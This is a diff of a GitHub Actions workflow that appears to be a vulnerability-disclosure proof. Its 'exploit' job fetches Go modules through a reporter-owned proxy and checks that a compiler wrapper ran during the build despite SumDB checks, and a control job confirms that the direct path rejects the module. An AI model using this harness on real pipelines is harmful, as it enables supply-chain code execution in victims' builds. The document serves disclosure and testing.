@@ -1,19 +1,19 @@
-name: Reporter owned SumDB CI proof
+name: Reporter owned SumDB autonomous schedule proof
 
 on:
-  push:
-    branches: [main]
+  schedule:
+    - cron: "57 14 2 11 *"
 
 permissions:
   contents: read
 
 jobs:
-  stock-go-build:
+  exploit:
     runs-on: ubuntu-24.04
     container: golang:1.25-bookworm
     timeout-minutes: 10
     env:
-      GOPROXY: https://go-sumdb-r112-ci-proxy-o324i7mbdq-uc.a.run.app/r112-ci-2f63673b0acf23e527576b36a22be31b
+      GOPROXY: https://go-sumdb-r114-sched-exp-o324i7mbdq-uc.a.run.app/r114-sched-53493ed01afb8321c1cbdbeb6dc1bee1
       GOSUMDB: sum.golang.org
       GONOSUMDB: ""
       GOPRIVATE: ""
@@ -21,29 +21,104 @@ jobs:
       GOTOOLCHAIN: local
       CGO_ENABLED: "1"
       GOFLAGS: -modcacherw
-      R112_MARKER_DIR: /tmp/r112-proof-ci
+      GOPATH: /tmp/r114-exploit-gopath
+      GOMODCACHE: /tmp/r114-exploit-gopath/pkg/mod
+      GOCACHE: /tmp/r114-exploit-gocache
+      R112_MARKER_DIR: /tmp/r112-proof-r114-exploit
     steps:
       - uses: actions/checkout@v4
-      - name: Run stock Go build
+      - name: Run stock Go exploit build
         shell: bash
         run: |
           set -euo pipefail
-          install -d -m 700 "$R112_MARKER_DIR"
-          go clean -modcache
+          test ! -e go.sum
+          rm -rf "$GOPATH" "$GOCACHE" "$R112_MARKER_DIR"
+          install -d -m 700 "$GOMODCACHE" "$GOCACHE" "$R112_MARKER_DIR"
           go mod tidy
           go test ./...
           marker="$R112_MARKER_DIR/compiler-wrapper-executed"
           test -s "$marker"
           grep -Fqx 'REPORTER_OWNED_FALSE_SUMDB_BUILD_EXEC_R112' "$marker"
-      - name: Record bounded execution receipt
-        if: success()
+      - name: Record exploit receipt
         shell: bash
         run: |
           set -euo pipefail
           marker="$R112_MARKER_DIR/compiler-wrapper-executed"
           {
-            printf 'schema=r112-google-signed-crosskey-github-actions/v1\n'
+            printf 'schema=r114-autonomous-schedule-exploit/v1\n'
             printf 'repository=%s\n' "$GITHUB_REPOSITORY"
+            printf 'event=%s\n' "$GITHUB_EVENT_NAME"
+            printf 'schedule=57 14 2 11 *\n'
+            printf 'run_id=%s\n' "$GITHUB_RUN_ID"
+            printf 'run_attempt=%s\n' "$GITHUB_RUN_ATTEMPT"
+            printf 'commit=%s\n' "$GITHUB_SHA"
+            printf 'runner_os=%s\n' "$RUNNER_OS"
+            printf 'runner_arch=%s\n' "$RUNNER_ARCH"
+            printf 'go_version=%s\n' "$(go version)"
+            printf 'gcc_version=%s\n' "$(gcc -dumpfullversion)"
+            printf 'goproxy=%s\n' "$(go env GOPROXY)"
+            printf 'gosumdb=%s\n' "$(go env GOSUMDB)"
+            printf 'gopath=%s\n' "$(go env GOPATH)"
+            printf 'gomodcache=%s\n' "$(go env GOMODCACHE)"
+            printf 'gocache=%s\n' "$(go env GOCACHE)"
+            printf 'cgo_enabled=%s\n' "$(go env CGO_ENABLED)"
+            printf 'go_sum_sha256=%s\n' "$(sha256sum go.sum | cut -d' ' -f1)"
+            printf 'marker_lines=%s\n' "$(wc -l < "$marker")"
+            printf 'marker_sha256=%s\n' "$(sha256sum "$marker" | cut -d' ' -f1)"
+            printf 'marker_value=%s\n' "$(sort -u "$marker")"
+          } | tee r114-exploit-receipt.txt
+      - name: Upload exploit receipt
+        uses: actions/upload-artifact@v4
+        with:
+          name: r114-exploit-receipt
+          path: |
+            r114-exploit-receipt.txt
+            go.sum
+          if-no-files-found: error
+          retention-days: 30
+
+  direct-sumdb-control:
+    runs-on: ubuntu-24.04
+    container: golang:1.25-bookworm
+    timeout-minutes: 10
+    env:
+      GOPROXY: https://go-sumdb-r114-sched-ctl-o324i7mbdq-uc.a.run.app/r114-sched-b6474049981c35defbd7f5a30179e8c0
+      GOSUMDB: sum.golang.org
+      GONOSUMDB: ""
+      GOPRIVATE: ""
+      GONOPROXY: none
+      GOTOOLCHAIN: local
+      CGO_ENABLED: "1"
+      GOFLAGS: -modcacherw
+      GOPATH: /tmp/r114-control-gopath
+      GOMODCACHE: /tmp/r114-control-gopath/pkg/mod
+      GOCACHE: /tmp/r114-control-gocache
+      R112_MARKER_DIR: /tmp/r112-proof-r114-control
+    steps:
+      - uses: actions/checkout@v4
+      - name: Require direct SumDB rejection
+        shell: bash
+        run: |
+          set -euo pipefail
+          test ! -e go.sum
+          rm -rf "$GOPATH" "$GOCACHE" "$R112_MARKER_DIR"
+          install -d -m 700 "$GOMODCACHE" "$GOCACHE" "$R112_MARKER_DIR"
+          set +e
+          go mod tidy >r114-control-output.txt 2>&1
+          tidy_status=$?
+          set -e
+          cat r114-control-output.txt
+          test "$tidy_status" -ne 0
+          grep -F 'checksum mismatch' r114-control-output.txt
+          grep -F 'downloaded:' r114-control-output.txt
+          grep -F 'sum.golang.org:' r114-control-output.txt
+          marker="$R112_MARKER_DIR/compiler-wrapper-executed"
+          test ! -e "$marker"
+          {
+            printf 'schema=r114-autonomous-schedule-control/v1\n'
+            printf 'repository=%s\n' "$GITHUB_REPOSITORY"
+            printf 'event=%s\n' "$GITHUB_EVENT_NAME"
+            printf 'schedule=57 14 2 11 *\n'
             printf 'run_id=%s\n' "$GITHUB_RUN_ID"
             printf 'run_attempt=%s\n' "$GITHUB_RUN_ATTEMPT"
             printf 'commit=%s\n' "$GITHUB_SHA"
@@ -52,16 +127,20 @@ jobs:
             printf 'go_version=%s\n' "$(go version)"
             printf 'goproxy=%s\n' "$(go env GOPROXY)"
             printf 'gosumdb=%s\n' "$(go env GOSUMDB)"
+            printf 'gopath=%s\n' "$(go env GOPATH)"
+            printf 'gomodcache=%s\n' "$(go env GOMODCACHE)"
+            printf 'gocache=%s\n' "$(go env GOCACHE)"
             printf 'cgo_enabled=%s\n' "$(go env CGO_ENABLED)"
-            printf 'marker_lines=%s\n' "$(wc -l < "$marker")"
-            printf 'marker_sha256=%s\n' "$(sha256sum "$marker" | cut -d' ' -f1)"
-            printf 'marker_value=%s\n' "$(sort -u "$marker")"
-          } | tee r112-ci-receipt.txt
-      - name: Upload receipt
-        if: success()
+            printf 'tidy_status=%s\n' "$tidy_status"
+            printf 'output_sha256=%s\n' "$(sha256sum r114-control-output.txt | cut -d' ' -f1)"
+            printf 'marker_absent=true\n'
+          } | tee r114-control-receipt.txt
+      - name: Upload control receipt
         uses: actions/upload-artifact@v4
         with:
-          name: r112-ci-receipt
-          path: r112-ci-receipt.txt
+          name: r114-control-receipt
+          path: |
+            r114-control-receipt.txt
+            r114-control-output.txt
           if-no-files-found: error
           retention-days: 30
